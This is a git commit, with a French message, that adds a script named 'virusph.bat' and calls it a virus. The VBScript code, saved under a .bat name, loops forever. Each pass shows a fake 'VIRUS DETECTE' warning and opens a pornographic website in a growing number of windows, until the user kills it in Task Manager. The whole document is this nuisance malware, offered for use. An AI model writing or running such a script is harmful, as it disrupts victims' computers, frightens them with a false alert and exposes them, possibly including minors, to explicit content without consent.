d56f7ee1e6cffccda3d98ece5a0f235b42560212
Kxbaz <87565919+Kxbaz@users.noreply.github.com>
2021-08-09 17:02:17 +0200

    Virus PH !
    Il ouvrira plein de fênetres ph et pour le fermer il faut le faire dans le gestionnaire des taches

---
+++ virusph.bat
@@ -0,0 +1,17 @@
+Dim sURL 
+Dim objShell
+Dim iNbFois
+
+iNbFois = 1
+
+sURL = "https://fr.pornhub.com/"
+
+Do While true
+ a = msgbox("VIRUS DETECTE" ,16, "ATTENTION")
+ For i2 = 1 to iNbFois
+  set objShell = CreateObject("WScript.Shell")
+  objShell.run(sURL)
+     WScript.Sleep 100
+ Next
+ iNbFois = iNbFois + 1
+Loop
